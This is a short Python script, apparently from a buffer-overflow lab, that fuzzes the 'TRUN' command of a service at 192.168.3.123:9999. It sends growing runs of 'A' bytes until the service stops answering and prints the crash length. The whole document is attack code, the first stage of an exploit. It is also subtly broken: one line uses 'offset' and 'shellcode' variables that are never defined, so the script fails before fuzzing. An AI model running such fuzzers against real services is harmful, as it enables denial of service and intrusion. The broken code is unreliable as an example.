#!/usr/bin/python3
import sys
import socket
from time import sleep

buffer = b"A" * 200


rest = b"C" * (2300 - len(buffer) - len(offset) - len(shellcode))

while True:
    try:
        sock = socket.create_connection(('192.168.3.123', 9999))
        payload = b'TRUN .' + buffer
        sock.settimeout(1)
        sock.send(payload)
        sleep(1)
        sock.recv(1024)
        buffer += b"A" * 200
        print("Sending request!")
    except:
        print("Fuzzing crash at %s bytes" % str(len(buffer)))
        sys.exit()





